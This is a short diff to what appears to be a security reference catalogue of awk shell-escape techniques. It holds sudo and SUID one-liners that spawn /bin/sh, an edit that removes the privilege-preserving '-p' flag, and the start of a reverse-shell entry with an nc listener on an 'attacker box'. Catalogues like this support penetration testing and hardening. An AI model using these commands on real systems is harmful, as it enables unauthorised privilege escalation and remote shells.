@@ -5,7 +5,7 @@ functions:
   sudo-enabled:
     - code: sudo awk 'BEGIN {system("/bin/sh")}'
   suid-limited:
-    - code: ./awk 'BEGIN {system("/bin/sh -p")}'
+    - code: ./awk 'BEGIN {system("/bin/sh")}'
   reverse-shell-non-interactive:
     - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
       code: |
